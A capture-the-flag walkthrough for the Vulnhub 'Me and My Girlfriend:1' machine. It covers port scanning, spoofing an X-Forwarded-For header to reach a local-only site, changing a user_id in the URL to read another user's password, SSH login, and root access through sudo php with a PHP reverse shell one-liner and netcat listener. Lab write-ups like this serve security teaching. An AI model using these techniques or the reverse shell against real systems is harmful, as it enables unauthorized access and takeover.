---
title: 'Me and My Girlfreind:1 Vulnhub Walkthrough'
date: 2019-12-18T09:13:00+01:00
draft: false
---

Me and My Girlfriends is another CTF challenge given by vulnhub and the level difficultly is set according to beginners. You have to hunt two flags, and this is a boot to root challenge.

**According to author:** _This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, “Ceban Corp”, something has changed from Alice’s attitude towards Bob like something is “hidden”, And Bob asks for your help to get what Alice is hiding and get full access to the company_.

Download it from **[here](https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/)**.

### **Penetration Testing Methodologies**

**Network Scanning**

*   Netdiscover
*   Nmap

**Enumeration**

*   Burp Suite

**Spawning shell**

*   ssh

**Privilege Escalations**

*   Sudo right

### **Walkthrough**

**Network Scanning**

First of all, we try to identify our target. We did this using the netdiscover command.

![](https://i1.wp.com/1.bp.blogspot.com/-VP30_6vqVHk/XfnXz4MzCyI/AAAAAAAAh-8/qb9HmgnBopkpI31jznEXTg6zLrbr6m87ACLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

Now that we have identified our target using the above command, we can continue to our next step i.e. scanning the host IP to identify open ports and running services. We will use Nmap to scan the target with the following command:

```
nmap -p- -A 192.168.29.148
```

We found port 22, 80 are open for ssh and HTTP respectively, let’s go for enumeration.

![](https://i1.wp.com/1.bp.blogspot.com/-MK9UTlXDgus/XfnX1_2_zPI/AAAAAAAAh_c/Sjh2qYAq3Rg56D8GF1ABmJxiG0a0YLHbQCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

### **Enumeration**

When you will explore machine IP in the web browser, you will see a message “this site can only be accessed local” which is a hint given by author that means the wep page will be accessible locally.

![](https://i1.wp.com/1.bp.blogspot.com/-uGjmBsyGfGA/XfnX2duCEbI/AAAAAAAAh_k/-Lw_dbZpFpgxKy7iHNciwRWxQ0Bj-DsngCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

Then I check for source page and notice the comment “to use **x-forwarded-for** header” to access the page, here we can say that there is possibility of host header injection ![😊](https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f60a.png).

![](https://i1.wp.com/1.bp.blogspot.com/-5I3htnZ7LBs/XfnX2SDfr9I/AAAAAAAAh_g/LwjAr48vd9Qly9iAh-tAFQdl-CAugoDlgCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

Without wasting time, I had edited the rule for the request header for **x-forwarded-for: localhost** in the burp suite and try to intercept the web page request along this.

![](https://i0.wp.com/1.bp.blogspot.com/-dnKkd-zMkbw/XfnX2hvOMQI/AAAAAAAAh_o/ks3ycOz3mpsQvvZk-UxnfqjEJDf2PT7ygCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

Once you have intercepted request, further you need to forward this request again and again till you receive the response on the web browser.

![](https://i0.wp.com/1.bp.blogspot.com/-Mi7PfpdyXd8/XfnX3WkDUII/AAAAAAAAh_s/bXVr7zS7D6oEDUatNQvUv-7pa2--_ILswCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

And finally, you will be able to access the web page for the Ceban Corp company as said by author. At this page I saw 4 captions that contains some hyperlink. Here I tried to figure out the possibilities for sql injection and LFI but failed to bypass this.

![](https://i2.wp.com/1.bp.blogspot.com/-Dx2ngJdUzlU/XfnX30jTgxI/AAAAAAAAh_w/2QgrvL5iEdEYLr7Ms1jn5gjy5ztjTq5YQCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

Since I was failed to enumerate any vulnerability, thus, register a new account by name of raj.

![](https://i1.wp.com/1.bp.blogspot.com/-kCUPHsBddLA/XfnXzwUq7LI/AAAAAAAAh_A/v-WWoqeS3EwvJRzt3iBG7-0qOM6b-g-EACLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

Then login as raj to investigate further.

![](https://i0.wp.com/1.bp.blogspot.com/-z-Egy35v19k/XfnXz_UP0xI/AAAAAAAAh_E/Nrx4ECZuyl8BzXzVh2GEd9HW--voBESmgCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

Once I logged in, I saw another their three captions “Dashboard, Profile, logout”. The profile caption denoted **user\_id** and for raj it is showing **user-id=12** in the URL.

![](https://i1.wp.com/1.bp.blogspot.com/-2XiOQU1d_cU/XfnX0m71yxI/AAAAAAAAh_I/gKPoqvm1oc0kCYPG_UxiNobc62sC-sN5gCLcBGAsYHQ/s1600/13.png?w=687&ssl=1)

In the given URL, I tried to change user\_id from user\_id=12 to user-id=1 and luckily I saw  the profile for another user, then frequently found profile for alice as user\_id=5, Moreover the password field was auto filed thus I was able to read the password from inside the inspect element.

Thus, I have following creds:

```
Username: alice  
Password: 4lic3
```

![](https://i1.wp.com/1.bp.blogspot.com/-W_eicKMHjpQ/XfnX0n8yw9I/AAAAAAAAh_M/3IJWeDD9UDI0i_Cik9CZBq9H6syBJrExgCLcBGAsYHQ/s1600/14.png?w=687&ssl=1)

### **Spwaning shell**

Since we have enumerated credential for the user alice therefore, further I used this credential to access host machine shell through ssh.

```
ssh alice@192.168.29.148
```

After spawning pty shell of the host machine, I looked for directory list where I found a hidden folder named as “.my\_secret” which contains two files: flag1.txt and my\_notes.txt.

Thus, we have found 1st flag, now let’s move forward for privilege escalation and capture the 2nd flag.

![](https://i0.wp.com/1.bp.blogspot.com/-FmMKIG15Fsk/XfnX04t4PmI/AAAAAAAAh_Q/DhSyTNs6dqQC5oL4OvN021D-9nEdTrPFwCLcBGAsYHQ/s1600/15.png?w=687&ssl=1)

### **Privilege Escalation**

Without wasting time, I looked for sudo rights and fortunately found that alice can run the php program as sudo user. Then I start the netcat listener in a new terminal and run the php reverse shell command in the host terminal.

```
sudo /usr/bin/php -r '$sock=fsockopen("192.168.29.157",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![](https://i0.wp.com/1.bp.blogspot.com/-pxPx2jgMWQo/XfnX1b4En9I/AAAAAAAAh_U/5MzscRcUt0oLOgpn6Hweg8m-KTs934wYQCLcBGAsYHQ/s1600/16.png?w=687&ssl=1)

Boomm!! We got the root shell through netcat session and inside the root we found the final flag.

```
nc -lvp 1234  
cd /root  
ls  
cat flag2.txt
```

![](https://i2.wp.com/1.bp.blogspot.com/-FkkdEJAroBo/XfnX1nkFgyI/AAAAAAAAh_Y/KeEvnCGZNhck4Lo5qHItQpg17qmHe_o6gCLcBGAsYHQ/s1600/17.png?w=687&ssl=1)

**Author**: Pinky Deka is trained in Certified Ethical hacking and Bug Bounty Hunter. Connect with her [**here**](https://www.linkedin.com/in/pinky-deka/)

The post [Me and My Girlfreind:1 Vulnhub Walkthrough](https://www.hackingarticles.in/me-and-my-girlfreind1-vulnhub-walkthrough/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/2PVn8Qi